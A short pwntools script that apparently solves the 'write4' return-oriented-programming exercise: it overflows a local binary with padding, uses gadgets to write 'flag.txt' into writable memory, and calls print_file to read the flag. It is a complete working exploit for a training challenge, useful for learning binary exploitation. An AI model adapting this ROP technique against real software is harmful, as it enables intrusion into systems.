#!/usr/bin/env python3

from pwn import *

padding = b"A" * 40
pop_r14_r15_addr = p64(0x400690)
rw_memory_addr = p64(0x601300)
pop_rdi_addr = p64(0x400693)
usefulGadgets_addr = p64(0x400628)
print_file_addr = p64(0x400510)

payload = (
    padding +
    pop_r14_r15_addr +
    rw_memory_addr +
    b"flag.txt" +
    usefulGadgets_addr +
    pop_rdi_addr +
    rw_memory_addr +
    print_file_addr
)

ps = process("./write4")
ps.sendline(payload)
print(ps.recvall().decode())

